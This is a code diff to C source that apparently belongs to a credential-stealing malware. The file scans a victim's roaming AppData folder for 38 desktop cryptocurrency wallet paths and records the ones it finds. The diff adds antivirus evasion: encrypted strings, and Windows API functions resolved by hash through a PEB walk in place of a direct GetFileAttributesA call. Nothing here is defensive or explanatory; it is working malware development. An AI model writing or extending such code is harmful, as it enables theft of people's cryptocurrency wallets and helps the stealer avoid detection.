@@ -1,9 +1,31 @@
 #include "wallet_desktop.h"
 #include "hash.h"
+#include "peb.h"
+#include "export_resolve.h"
+#include "enc_strings.h"
 #include <stdlib.h>
 #include <string.h>
 #include <stdio.h>
 #include <windows.h>
+
+typedef DWORD (WINAPI *pGetFileAttributesA_wd)(LPCSTR);
+
+static struct {
+    pGetFileAttributesA_wd pGFAA;
+    int ready;
+} g_wd_k32;
+
+static int wd_ensure_k32(void) {
+    if (g_wd_k32.ready) return 1;
+    char dll[32]; enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
+    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
+    if (!k32) return 0;
+    char fn[32]; enc_decrypt(enc_GetFileAttributesA, ENC_GETFILEATTRIBUTESA_LEN, fn);
+    g_wd_k32.pGFAA = (pGetFileAttributesA_wd)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    if (!g_wd_k32.pGFAA) return 0;
+    g_wd_k32.ready = 1;
+    return 1;
+}
 
 // 38 desktop wallet names and paths
 static const char *desktop_names[] = {
@@ -73,7 +95,8 @@ WalletDesktopData *collect_wallet_desktop(const char *roaming_app_data, size_t *
         char full_path[1024];
         snprintf(full_path, sizeof(full_path), "%s\\%s", roaming_app_data, desktop_paths[i]);
         
-        DWORD attr = GetFileAttributesA(full_path);
+        if (!wd_ensure_k32()) break;
+        DWORD attr = g_wd_k32.pGFAA(full_path);
         if (attr != INVALID_FILE_ATTRIBUTES) {
             results[found].name = strdup(desktop_names[i]);
             results[found].path = strdup(full_path);
